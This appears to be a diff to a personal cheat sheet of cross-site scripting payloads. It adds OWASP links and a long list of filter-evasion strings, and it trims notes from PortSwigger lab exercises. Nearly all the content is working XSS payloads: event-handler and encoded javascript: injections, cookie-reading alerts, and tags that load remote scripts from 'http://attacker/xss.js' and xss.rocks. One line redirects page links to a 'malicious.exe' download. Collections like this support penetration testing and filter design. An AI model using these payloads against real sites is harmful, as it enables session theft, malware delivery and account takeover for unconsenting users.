@@ -1,4 +1,8 @@
 ```
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md
+https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html
 https://xsshunter.com/app
 
 https://www.volkis.com.au/blog/bypass-xss-in-wafs/
@@ -7,41 +11,22 @@ https://tweetedtimes.com/v/1939
 ```
 
 ```css
-**DOM XSS in document.write sink using source**
-
 "><svg onload=alert(1)>
-
-DOM XSS in innerHTML sink using source 
 
 <img src=1 onerror=alert(1)>
 
-DOM XSS in jQuery anchor href attribute sink using location.search source
-
 javascript:alert(document.cookie)
 storeId=</option></select><script>alert(1)</script>
-Example : https://0a1b00b703f8e6d4c04d6bac00fe00ad.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
-
-DOM XSS in jQuery selector sink using a hashchange event
 
 <iframe src="https://0a2300c8047be35ac091f21a00f8009b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-Example : Above code is work on Body section of the message or response box.
-
-Reflected XSS into attribute with angle brackets HTML-encoded
 
 "onmouseover="alert(1)
 " onfocus=alert(1) autofocus foo="
 javascript:alert(1)
-Example : In search box the response that we search that the random string has been reflected inside a quoted attribute like 126g37e2ue --> '126g37e2ue'.
-
-Stored XSS into anchor href attribute with double quotes HTML-encoded
-
-javascript:alert(1)
-Example : type the payload in blogs post comment website sections.
-
-Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
 ```
 
+# Payloads
 ```python
 "><svg onload=alert(document.cookie)>
 
@@ -103,6 +88,191 @@ batman"></form><div%20class="inner%20product-tab"><h3><jAvAsCrIpT:%20onclick=loc
 <svg/On/OnLoAd=confirm(1)>
 "><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+
+<h1>Vulnmachines</h1>
+
+<img src="x:gif" onerror="window['al\u0065rt'] (0)"></img>
+“><script>alert(document.cookie)</script>
+<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3cscript%3ealert(document.cookie)%3c/script%3e
+<body onload=alert('test1')>
+<scr<script>ipt>alert(document.cookie)</script>
+
+<?
+    $re = "/<script[^>]+src/i";
+    if (preg_match($re, $_GET['var']))
+    {
+        echo "Filtered";
+        return;
+    }
+    echo "Welcome ".$_GET['var']." !";
+?>
+
+<script [anything but the character: '>'] src
+<script src="http://attacker/xss.js"></script>
+http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
+http://example/page.php?param=<script&param=>[...]</&param=script>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14; javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SCRIPT SRC=//xss.rocks/.j>
+/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/
+<IMG SRC="('XSS')"
+<iframe src=http://xss.rocks/scriptlet.html <
+<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>
+<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>
+\";alert('XSS');//
+</script><script>alert('XSS');</script>
+
+End Title Tag
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+INPUT Image
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+BODY Image
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+IMG Dynsrc
+<IMG DYNSRC="javascript:alert('XSS')">
+
+IMG Lowsrc
+<IMG LOWSRC="javascript:alert('XSS')">
+
+List-style-image
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+
+VBscript in an Image
+<IMG SRC='vbscript:msgbox("XSS")'>
+
+Livescript (older versions of Netscape only)
+<IMG SRC="livescript:[code]">
+
+SVG Object Tag
+<svg/onload=alert('XSS')>
+
+ECMAScript 6
+Set.constructor`alert\x28document.domain\x29
+
+BODY Tag
+<BODY ONLOAD=alert('XSS')>
+
+BGSOUND
+<BGSOUND SRC="javascript:alert('XSS');">
+
+JavaScript includes
+<BR SIZE="&{alert('XSS')}">
+
+STYLE sheet
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> <STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+¼script¾alert(¢XSS¢)¼/script¾
+
+IFRAME
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+IFRAME Event Based
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+
+FRAME
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+TABLE
+<TABLE BACKGROUND="javascript:alert('XSS')">
+
+TD
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+
+DIV Background-image
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+
+
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<!--[if gte IE 4]>
+<SCRIPT>alert('XSS');</SCRIPT>
+<![endif]-->
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+
+Using ActionScript Inside Flash for Obfuscation
+a="get";
+b="URL(\"";
+c="javascript:";
+d="alert('XSS');\")"; 
+eval(a+b+c+d);
+
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+
+<XML SRC="xsstest.xml" ID=I></XML>  
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+
+<? echo('<SCR)';
+echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+Cookie Manipulation
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+
+/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
+/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
+<SCRIPT a=>SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+
 
 ```
 
